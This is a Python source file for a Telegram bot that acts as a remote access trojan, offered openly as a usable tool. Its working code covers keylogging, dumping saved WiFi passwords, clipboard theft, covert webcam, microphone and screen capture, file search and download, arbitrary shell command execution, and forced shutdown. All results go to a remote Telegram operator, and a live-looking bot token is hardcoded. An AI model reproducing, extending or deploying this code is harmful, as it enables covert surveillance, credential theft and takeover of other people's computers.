import os
import asyncio
import subprocess
import logging
import platform
import socket
import psutil
import pyautogui
import cv2
import numpy as np
import requests
import keyboard
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.enums import ParseMode
from aiogram.types import FSInputFile
from aiogram.utils.keyboard import ReplyKeyboardBuilder
from cryptography.fernet import Fernet
from logging.handlers import RotatingFileHandler
import speedtest
import win32clipboard
import win32gui
import win32con
import schedule
import json

# Configuration
CONFIG = {
    "TOKEN": "8085050584:AAEBsZbNbI761Pzdc2cSJwMgzK0wTb81b0Y",
    "ALLOWED_IDS": [1432862317],
    "LOG_FILE": "bot.log",
    "KEYLOG_FILE": "keylog.txt",
    "SCREENSHOT_PATH": "screenshot.png",
    "WEBCAM_PATH": "webcam_photo.jpg",
    "RECORDING_PATH": "recording.wav",
    "SCREEN_RECORD_PATH": "screen_record.mp4",
    "ENCRYPTION_KEY_FILE": "secret.key",
}

# Setup logging with rotation
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = RotatingFileHandler(CONFIG["LOG_FILE"], maxBytes=5*1024*1024, backupCount=3)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)

# Initialize bot
bot = Bot(token=CONFIG["TOKEN"])
dp = Dispatcher()

# State management
class BotState:
    def __init__(self):
        self.keylogger_active = False
        self.active_sessions = set()
        self.encryption_key = None
    
    def load_encryption_key(self):
        if os.path.exists(CONFIG["ENCRYPTION_KEY_FILE"]):
            with open(CONFIG["ENCRYPTION_KEY_FILE"], "rb") as f:
                self.encryption_key = f.read()
        else:
            self.encryption_key = Fernet.generate_key()
            with open(CONFIG["ENCRYPTION_KEY_FILE"], "wb") as f:
                f.write(self.encryption_key)

state = BotState()

# Enhanced keyboard layout
def get_main_keyboard():
    builder = ReplyKeyboardBuilder()
    categories = [
        ["🖥 System", "🌐 Network", "🔒 Security"],
        ["📸 Media", "💾 Storage", "📊 Monitor"],
        ["🎮 Control", "📋 Advanced", "🛑 Shutdown"],
    ]
    
    for row in categories:
        for button in row:
            builder.add(types.KeyboardButton(text=button))
    
    return builder.as_markup(resize_keyboard=True)

def get_category_keyboard(category):
    builder = ReplyKeyboardBuilder()
    buttons = {
        "System": ["SysInfo", "Processes", "Uptime", "Battery", "Back"],
        "Network": ["IP", "Network Interfaces", "Speed Test", "WiFi", "Back"],
        "Security": ["Clipboard", "Keylog Start", "Keylog Stop", "Encrypt File", "Decrypt File", "Back"],
        "Media": ["Screenshot", "Camera", "Microphone", "Screen Record", "Back"],
        "Storage": ["Disks", "Files", "Search File", "Download File", "Back"],
        "Monitor": ["System Monitor", "Temperature", "Logs", "Tasks", "Back"],
        "Control": ["Execute Command", "Remote Mouse", "Send Notification", "Back"],
        "Advanced": ["Browsers", "Kill Process", "Restart", "Back"],
    }
    
    for button in buttons.get(category, []):
        builder.add(types.KeyboardButton(text=button))
    
    builder.adjust(3)
    return builder.as_markup(resize_keyboard=True)

# Security check
async def check_access(user_id: int) -> bool:
    if user_id not in CONFIG["ALLOWED_IDS"]:
        logger.warning(f"Unauthorized access attempt by user {user_id}")
        return False
    state.active_sessions.add(user_id)
    return True

# Command handlers
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if not await check_access(message.from_user.id):
        await message.answer("🚫 Access Denied!")
        return
    await message.answer("🔐 Welcome! Select a category:", reply_markup=get_main_keyboard())
    logger.info(f"User {message.from_user.id} started the bot")

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    if not await check_access(message.from_user.id):
        return
    help_text = """
📋 **Available Commands:**

**System:**
/sysinfo - System information
/processes - Running processes
/uptime - System uptime
/battery - Battery status

**Network:**
/ip - IP information
/network - Network interfaces
/speedtest - Internet speed test
/wifi - WiFi credentials

**Security:**
/clipboard - Get clipboard content
/keylog [start|stop] - Keyboard logger
/encrypt - Encrypt file
/decrypt - Decrypt file

**Media:**
/screenshot - Take screenshot
/camera - Capture webcam photo
/microphone - Record audio
/record_screen - Record screen

**Storage:**
/disks - Disk information
/files [path] - List files
/search [name] - Search files
/download [path] - Download file

**Monitoring:**
/monitor - System monitoring
/temperature - Component temperatures
/logs - System logs
/tasks - Scheduled tasks

**Control:**
/cmd [command] - Execute command
/mouse [x y] - Move mouse
/notification [text] - Send notification

**Advanced:**
/browsers - Installed browsers
/kill [pid] - Kill process
/restart - Restart system
/shutdown - Shutdown system
"""
    await message.answer(help_text, parse_mode=ParseMode.HTML)

# System commands
@dp.message(lambda msg: msg.text in ["SysInfo", "Processes", "Uptime", "Battery"])
async def handle_system_commands(message: types.Message):
    if not await check_access(message.from_user.id):
        return
    
    try:
        if message.text == "SysInfo":
            uname = platform.uname()
            boot_time = datetime.fromtimestamp(psutil.boot_time())
            sys_info = (
                f"🖥 **System Information:**\n"
                f"OS: {uname.system}\n"
                f"Hostname: {uname.node}\n"
                f"Version: {uname.version}\n"
                f"Architecture: {platform.architecture()[0]}\n"
                f"CPU: {uname.processor}\n"
                f"Cores: {psutil.cpu_count(logical=False)}\n"
                f"Threads: {psutil.cpu_count(logical=True)}\n"
                f"CPU Usage: {psutil.cpu_percent()}%\n"
                f"RAM Total: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
                f"RAM Used: {round(psutil.virtual_memory().used / (1024**3), 2)} GB\n"
                f"Boot Time: {boot_time.strftime('%Y-%m-%d %H:%M:%S')}"
            )
            await message.answer(sys_info, parse_mode=ParseMode.HTML)
        
        elif message.text == "Processes":
            processes = sorted(
                [proc.info for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])],
                key=lambda p: p['cpu_percent'], reverse=True
            )[:10]
            proc_info = "🔄 **Top 10 Processes:**\n"
            for proc in processes:
                proc_info += (
                    f"\n📌 PID: {proc['pid']}\n"
                    f"Name: {proc['name']}\n"
                    f"CPU: {proc['cpu_percent']}%\n"
                    f"RAM: {round(proc['memory_percent'], 2)}%"
                )
            await message.answer(proc_info, parse_mode=ParseMode.HTML)
        
        elif message.text == "Uptime":
            boot_time = datetime.fromtimestamp(psutil.boot_time())
            uptime = datetime.now() - boot_time
            await message.answer(
                f"⏱ **System Uptime:**\n"
                f"Boot: {boot_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"Uptime: {str(uptime).split('.')[0]}",
                parse_mode=ParseMode.HTML
            )
        
        elif message.text == "Battery":
            battery = psutil.sensors_battery()
            if not battery:
                await message.answer("🔋 Battery information unavailable")
                return
            await message.answer(
                f"🔋 **Battery Status:**\n"
                f"Charge: {battery.percent}%\n"
                f"Status: {'Charging' if battery.power_plugged else 'Discharging'}\n"
                f"Time Left: {round(battery.secsleft / 3600, 2) if battery.secsleft > 0 else 'Unknown'} hours",
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        logger.error(f"System command error: {str(e)}")
        await message.answer(f"⚠ Error: {str(e)}")

# Network commands
@dp.message(lambda msg: msg.text in ["IP", "Network Interfaces", "Speed Test", "WiFi"])
async def handle_network_commands(message: types.Message):
    if not await check_access(message.from_user.id):
        return
    
    try:
        if message.text == "IP":
            response = requests.get('https://ipinfo.io/json')
            data = response.json()
            ip_info = (
                f"🌐 **IP Information:**\n"
                f"IP: {data.get('ip', 'N/A')}\n"
                f"City: {data.get('city', 'N/A')}\n"
                f"Region: {data.get('region', 'N/A')}\n"
                f"Country: {data.get('country', 'N/A')}\n"
                f"ISP: {data.get('org', 'N/A')}\n"
                f"Coordinates: {data.get('loc', 'N/A')}\n"
                f"Timezone: {data.get('timezone', 'N/A')}"
            )
            await message.answer(ip_info, parse_mode=ParseMode.HTML)
        
        elif message.text == "Network Interfaces":
            net_info = "📶 **Network Interfaces:**\n"
            for interface_name, addresses in psutil.net_if_addrs().items():
                net_info += f"\n🔹 **{interface_name}**\n"
                for addr in addresses:
                    if addr.family == socket.AF_INET:
                        net_info += f"IPv4: {addr.address}\nMask: {addr.netmask}\n"
                    elif addr.family == socket.AF_INET6:
                        net_info += f"IPv6: {addr.address}\n"
                    elif addr.family == psutil.AF_LINK:
                        net_info += f"MAC: {addr.address}\n"
            await message.answer(net_info, parse_mode=ParseMode.HTML)
        
        elif message.text == "Speed Test":
            await message.answer("📡 Running speed test...")
            st = speedtest()
            st.get_best_server()
            download = st.download() / 1_000_000  # Convert to Mbps
            upload = st.upload() / 1_000_000  # Convert to Mbps
            ping = st.results.ping
            await message.answer(
                f"📡 **Speed Test Results:**\n"
                f"Download: {round(download, 2)} Mbps\n"
                f"Upload: {round(upload, 2)} Mbps\n"
                f"Ping: {round(ping, 2)} ms",
                parse_mode=ParseMode.HTML
            )
        
        elif message.text == "WiFi":
            if platform.system() != "Windows":
                await message.answer("ℹ WiFi credentials available only on Windows")
                return
            profiles = subprocess.check_output("netsh wlan show profiles").decode('cp866').split('\n')
            profiles = [line.split(":")[1].strip() for line in profiles if "Все профили пользователей" in line]
            wifi_info = "📶 **Saved WiFi Networks:**\n"
            for profile in profiles[:10]:
                try:
                    results = subprocess.check_output(f"netsh wlan show profile \"{profile}\" key=clear").decode('cp866')
                    password = [line.split(":")[1].strip() for line in results.split('\n') if "Содержимое ключа" in line]
                    wifi_info += f"\n📶 **{profile}**\n🔑 Password: <code>{password[0] if password else 'No password'}</code>\n"
                except:
                    wifi_info += f"\n📶 **{profile}**\n🔑 Password: <i>Unable to retrieve</i>\n"
            await message.answer(wifi_info, parse_mode=ParseMode.HTML)
            
    except Exception as e:
        logger.error(f"Network command error: {str(e)}")
        await message.answer(f"⚠ Error: {str(e)}")

# Security commands
@dp.message(lambda msg: msg.text in ["Clipboard", "Keylog Start", "Keylog Stop", "Encrypt File", "Decrypt File"])
async def handle_security_commands(message: types.Message):
    if not await check_access(message.from_user.id):
        return
    
    try:
        if message.text == "Clipboard":
            if platform.system() == "Windows":
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                await message.answer(
                    f"📋 **Clipboard Content:**\n\n<code>{data[:1000]}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                try:
                    data = subprocess.check_output(['xclip', '-selection', 'clipboard', '-o']).decode('utf-8')
                    await message.answer(
                        f"📋 **Clipboard Content:**\n\n<code>{data[:1000]}</code>",
                        parse_mode=ParseMode.HTML
                    )
                except:
                    await message.answer("ℹ Clipboard access only for Windows/Linux with xclip")
        
        elif message.text == "Keylog Start":
            if state.keylogger_active:
                await message.answer("⌨ Keylogger already running")
                return
            state.keylogger_active = True
            await message.answer("⌨ Keylogger started. Use 'Keylog Stop' to stop")
            asyncio.create_task(run_keylogger())
        
        elif message.text == "Keylog Stop":
            if not state.keylogger_active:
                await message.answer("⌨ Keylogger not running")
                return
            state.keylogger_active = False
            if os.path.exists(CONFIG["KEYLOG_FILE"]):
                with open(CONFIG["KEYLOG_FILE"], 'r') as f:
                    log_data = f.read()
                if log_data:
                    await message.answer_document(FSInputFile(CONFIG["KEYLOG_FILE"], filename="keylog.txt"))
                os.remove(CONFIG["KEYLOG_FILE"])
            await message.answer("⌨ Keylogger stopped")
        
        elif message.text == "Encrypt File":
            await message.answer("📤 Please send the file to encrypt")
            # Implement file encryption logic in document handler
            # State management for encryption can be added using aiogram's FSM
        
        elif message.text == "Decrypt File":
            await message.answer("📤 Please send the encrypted file to decrypt")
            # Implement file decryption logic in document handler
            
    except Exception as e:
        logger.error(f"Security command error: {str(e)}")
        await message.answer(f"⚠ Error: {str(e)}")

# Media commands
@dp.message(lambda msg: msg.text in ["Screenshot", "Camera", "Microphone", "Screen Record"])
async def handle_media_commands(message: types.Message):
    if not await check_access(message.from_user.id):
        return
    
    try:
        if message.text == "Screenshot":
            pyautogui.screenshot(CONFIG["SCREENSHOT_PATH"])
            photo = FSInputFile(CONFIG["SCREENSHOT_PATH"])
            await message.answer_photo(photo)
            os.remove(CONFIG["SCREENSHOT_PATH"])
        
        elif message.text == "Camera":
            camera = cv2.VideoCapture(0)
            ret, frame = camera.read()
            if ret:
                cv2.imwrite(CONFIG["WEBCAM_PATH"], frame)
                photo = FSInputFile(CONFIG["WEBCAM_PATH"])
                await message.answer_photo(photo)
                os.remove(CONFIG["WEBCAM_PATH"])
            else:
                await message.answer("⚠ Unable to capture webcam image")
            camera.release()
        
        elif message.text == "Microphone":
            import sounddevice as sd
            from scipy.io.wavfile import write
            await message.answer("🎤 Recording audio (5 seconds)...")
            fs, seconds = 44100, 5
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write(CONFIG["RECORDING_PATH"], fs, recording)
            audio = FSInputFile(CONFIG["RECORDING_PATH"])
            await message.answer_audio(audio)
            os.remove(CONFIG["RECORDING_PATH"])
        
        elif message.text == "Screen Record":
            await message.answer("🎥 Starting screen recording (5 seconds)...")
            screen_size, fps, duration = (1920, 1080), 10.0, 5
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(CONFIG["SCREEN_RECORD_PATH"], fourcc, fps, screen_size)
            for _ in range(int(fps * duration)):
                screenshot = np.array(pyautogui.screenshot())
                screenshot = cv2.cvtColor(screenshot, cv2.COLOR_RGB2BGR)
                out.write(screenshot)
                await asyncio.sleep(1/fps)
            out.release()
            await message.answer_video(FSInputFile(CONFIG["SCREEN_RECORD_PATH"], filename="screen_record.mp4"))
            os.remove(CONFIG["SCREEN_RECORD_PATH"])
            
    except Exception as e:
        logger.error(f"Media command error: {str(e)}")
        await message.answer(f"⚠ Error: {str(e)}")

# Storage commands
@dp.message(lambda msg: msg.text in ["Disks", "Files", "Search File", "Download File"])
async def handle_storage_commands(message: types.Message):
    if not await check_access(message.from_user.id):
        return
    
    try:
        if message.text == "Disks":
            disks_info = "💾 **Disk Information:**\n"
            for partition in psutil.disk_partitions():
                usage = psutil.disk_usage(partition.mountpoint)
                disks_info += (
                    f"\n📌 Device: {partition.device}\n"
                    f"Mountpoint: {partition.mountpoint}\n"
                    f"Filesystem: {partition.fstype}\n"
                    f"Total: {round(usage.total / (1024**3), 2)} GB\n"
                    f"Used: {round(usage.used / (1024**3), 2)} GB\n"
                    f"Free: {round(usage.free / (1024**3), 2)} GB\n"
                    f"Usage: {usage.percent}%"
                )
            await message.answer(disks_info, parse_mode=ParseMode.HTML)
        
        elif message.text == "Files":
            path = message.text[6:].strip() or "."
            if not os.path.exists(path):
                await message.answer("⚠ Path does not exist")
                return
            files, dirs = [], []
            for item in os.listdir(path):
                (files if os.path.isfile(os.path.join(path, item)) else dirs).append(item)
            response = f"📂 **{path} Contents:**\n\n📁 Folders:\n{'\n'.join(dirs[:20])}\n\n📄 Files:\n{'\n'.join(files[:20])}"
            if len(dirs) > 20 or len(files) > 20:
                response += f"\n\n...and {max(len(dirs)-20, len(files)-20, 0)} more items"
            await message.answer(response)
        
        elif message.text == "Search File":
            await message.answer("🔍 Please enter file name to search")
            # Implement search logic in text handler
        
        elif message.text == "Download File":
            await message.answer("📤 Please enter file path to download")
            # Implement download logic in text handler
            
    except Exception as e:
        logger.error(f"Storage command error: {str(e)}")
        await message.answer(f"⚠ Error: {str(e)}")

# Monitoring commands
@dp.message(lambda msg: msg.text in ["System Monitor", "Temperature", "Logs", "Tasks"])
async def handle_monitoring_commands(message: types.Message):
    if not await check_access(message.from_user.id):
        return
    
    try:
        if message.text == "System Monitor":
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            battery = psutil.sensors_battery()
            monitor_info = (
                f"📊 **System Monitoring:**\n\n"
                f"🖥 CPU: {cpu_percent}%\n"
                f"🧠 RAM: {memory.percent}% ({memory.used/1024/1024:.1f} MB / {memory.total/1024/1024:.1f} MB)\n"
                f"💾 Disk: {disk.percent}% ({disk.used/1024/1024:.1f} MB / {disk.total/1024/1024:.1f} MB)\n"
            )
            if battery:
                monitor_info += f"🔋 Battery: {battery.percent}% ({'Charging' if battery.power_plugged else 'Discharging'})\n"
            processes = sorted(
                [proc.info for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])],
                key=lambda p: p['cpu_percent'], reverse=True
            )[:3]
            monitor_info += "\n**Top 3 Processes:**\n"
            for proc in processes:
                monitor_info += f"🔹 {proc['name']} (CPU: {proc['cpu_percent']}%, RAM: {proc['memory_percent']}%)\n"
            await message.answer(monitor_info, parse_mode=ParseMode.HTML)
        
        elif message.text == "Temperature":
            try:
                import GPUtil
                temp_info = "🌡 **Component Temperatures:**\n"
                if hasattr(psutil, "sensors_temperatures"):
                    temps = psutil.sensors_temperatures()
                    if temps:
                        for name, entries in temps.items():
                            for entry in entries:
                                temp_info += f"🖥 {name}: {entry.current}°C\n"
                for gpu in GPUtil.getGPUs():
                    temp_info += f"🎮 GPU {gpu.id}: {gpu.temperature}°C\n"
                await message.answer(temp_info, parse_mode=ParseMode.HTML)
            except ImportError:
                await message.answer("⚠ Please install GPUtil (pip install gputil)")
        
        elif message.text == "Logs":
            log_types = {"System": "System", "Application": "Application", "Security": "Security"}
            log_info = "📜 **Recent System Logs:**\n\n"
            for log_name, log_source in log_types.items():
                try:
                    if platform.system() == "Windows":
                        cmd = f'powershell "Get-EventLog -LogName {log_source} -Newest 3 | Format-Table -Wrap"'
                        logs = subprocess.check_output(cmd, shell=True).decode('cp866')
                        log_info += f"**{log_name}:**\n<pre>{logs[:1000]}</pre>\n"
                    else:
                        cmd = 'journalctl -n 5 --no-pager'
                        logs = subprocess.check_output(cmd, shell=True).decode('utf-8')
                        log_info += f"**System Logs:**\n<pre>{logs[:1000]}</pre>"
                        break
                except Exception as e:
                    log_info += f"⚠ Error reading {log_name} log: {str(e)}\n"
            await message.answer(log_info, parse_mode=ParseMode.HTML)
        
        elif message.text == "Tasks":
            if platform.system() == "Windows":
                cmd = 'schtasks /query /fo LIST /v | findstr "TaskName Next"'
                tasks = subprocess.check_output(cmd, shell=True).decode('cp866')
                await message.answer(
                    f"⏰ **Scheduled Tasks:**\n<pre>{tasks[:2000]}</pre>",
                    parse_mode=ParseMode.HTML
                )
            else:
                cmd = 'crontab -l'
                try:
                    tasks = subprocess.check_output(cmd, shell=True).decode('utf-8')
                    await message.answer(
                        f"⏰ **Scheduled Tasks:**\n<pre>{tasks[:2000]}</pre>",
                        parse_mode=ParseMode.HTML
                    )
                except:
                    await message.answer("ℹ No scheduled tasks found")
                    
    except Exception as e:
        logger.error(f"Monitoring command error: {str(e)}")
        await message.answer(f"⚠ Error: {str(e)}")

# Control commands
@dp.message(lambda msg: msg.text in ["Execute Command", "Remote Mouse", "Send Notification"])
async def handle_control_commands(message: types.Message):
    if not await check_access(message.from_user.id):
        return
    
    try:
        if message.text == "Execute Command":
            await message.answer("💻 Enter command to execute")
            # Implement command execution in text handler
        
        elif message.text == "Remote Mouse":
            await message.answer("🖱 Enter mouse coordinates (x y) or 'click'")
            # Implement mouse control in text handler
        
        elif message.text == "Send Notification":
            await message.answer("📢 Enter notification message")
            # Implement notification sending in text handler
            
    except Exception as e:
        logger.error(f"Control command error: {str(e)}")
        await message.answer(f"⚠ Error: {str(e)}")

# Advanced commands
@dp.message(lambda msg: msg.text in ["Browsers", "Kill Process", "Restart", "Shutdown"])
async def handle_advanced_commands(message: types.Message):
    if not await check_access(message.from_user.id):
        return
    
    try:
        if message.text == "Browsers":
            browsers = {
                "Chrome": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                "Firefox": r"C:\Program Files\Mozilla Firefox\firefox.exe",
                "Edge": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                "Opera": r"C:\Program Files\Opera\launcher.exe",
                "Brave": r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
            }
            installed = [name for name, path in browsers.items() if os.path.exists(path)]
            await message.answer(
                f"🔍 **Installed Browsers:**\n{', '.join(installed) or '❌ None'}",
                parse_mode=ParseMode.HTML
            )
        
        elif message.text == "Kill Process":
            await message.answer("🛑 Enter PID to kill")
            # Implement process killing in text handler
        
        elif message.text == "Restart":
            await message.answer("🔄 Restarting system...")
            os.system("shutdown /r /t 1")
        
        elif message.text == "Shutdown":
            await message.answer("🛑 Shutting down system...")
            os.system("shutdown /s /t 1")
            
    except Exception as e:
        logger.error(f"Advanced command error: {str(e)}")
        await message.answer(f"⚠ Error: {str(e)}")

# Category navigation
@dp.message(lambda msg: msg.text in [
    "🖥 System", "🌐 Network", "🔒 Security", "📸 Media",
    "💾 Storage", "📊 Monitor", "🎮 Control", "📋 Advanced"
])
async def handle_category(message: types.Message):
    if not await check_access(message.from_user.id):
        return
    category = message.text.split()[1]
    await message.answer(f"🔍 {category} Commands:", reply_markup=get_category_keyboard(category))

@dp.message(lambda msg: msg.text == "Back")
async def handle_back(message: types.Message):
    if not await check_access(message.from_user.id):
        return
    await message.answer("🔐 Select a category:", reply_markup=get_main_keyboard())

# Keylogger implementation
async def run_keylogger():
    try:
        with open(CONFIG["KEYLOG_FILE"], 'w') as f:
            f.write(f"Keylogger started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        def on_key(event):
            if not state.keylogger_active:
                return False
            with open(CONFIG["KEYLOG_FILE"], 'a') as f:
                if event.event_type == keyboard.KEY_DOWN:
                    if event.name == 'space':
                        f.write(' ')
                    elif event.name == 'enter':
                        f.write('\n')
                    elif event.name == 'backspace':
                        f.write('[BACKSPACE]')
                    elif len(event.name) > 1:
                        f.write(f'[{event.name}]')
                    else:
                        f.write(event.name)
        
        keyboard.hook(on_key)
        while state.keylogger_active:
            await asyncio.sleep(1)
        keyboard.unhook_all()
    except Exception as e:
        logger.error(f"Keylogger error: {str(e)}")
        state.keylogger_active = False

# Text handler for dynamic commands
@dp.message()
async def handle_text(message: types.Message):
    if not await check_access(message.from_user.id):
        return
    
    try:
        text = message.text.strip()
        
        if text.startswith("/cmd"):
            command = text[5:].strip()
            if not command:
                await message.answer("ℹ Specify command after /cmd")
                return
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode("cp866")
            await message.answer(f"<pre>{result[:4000]}</pre>", parse_mode=ParseMode.HTML)
        
        elif text.startswith("/mouse"):
            parts = text.split()
            if len(parts) == 3 and parts[1].isdigit() and parts[2].isdigit():
                x, y = int(parts[1]), int(parts[2])
                pyautogui.moveTo(x, y)
                await message.answer(f"🖱 Mouse moved to ({x}, {y})")
            elif parts[1].lower() == "click":
                pyautogui.click()
                await message.answer("🖱 Mouse clicked")
            else:
                await message.answer("ℹ Usage: /mouse x y or /mouse click")
        
        elif text.startswith("/notification"):
            msg = text[12:].strip()
            if not msg:
                await message.answer("ℹ Specify notification message")
                return
            if platform.system() == "Windows":
                from win11toast import toast
                toast("Bot Notification", msg, duration='short')
                await message.answer("📢 Notification sent")
            else:
                await message.answer("ℹ Notifications only supported on Windows")
        
        elif text.startswith("/kill"):
            parts = text.split()
            if len(parts) < 2:
                await message.answer("ℹ Specify PID: /kill 1234")
                return
            try:
                pid = int(parts[1])
                process = psutil.Process(pid)
                process.terminate()
                await message.answer(f"🛑 Process {pid} terminated")
            except psutil.NoSuchProcess:
                await message.answer(f"⚠ Process {pid} not found")
        
        elif text.startswith("/search"):
            search_term = text[7:].strip()
            if not search_term:
                await message.answer("ℹ Specify file name after /search")
                return
            await message.answer("🔍 Searching files...")
            found_files = []
            for root, _, files in os.walk("C:\\"):
                for file in files:
                    if search_term.lower() in file.lower():
                        found_files.append(os.path.join(root, file))
                        if len(found_files) >= 20:
                            break
                if len(found_files) >= 20:
                    break
            response = "🔍 **Found Files:**\n\n" + "\n".join(found_files) if found_files else "No files found"
            await message.answer(response[:4000])
        
        elif text.startswith("/download"):
            file_path = text[9:].strip()
            if not file_path or not os.path.exists(file_path):
                await message.answer("⚠ Invalid file path")
                return
            if os.path.getsize(file_path) > 50 * 1024 * 1024:
                await message.answer("⚠ File too large (max 50MB)")
                return
            await message.answer_document(FSInputFile(file_path))
        
    except Exception as e:
        logger.error(f"Text command error: {str(e)}")
        await message.answer(f"⚠ Error: {str(e)}")


# Main function
async def main():
    state.load_encryption_key()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())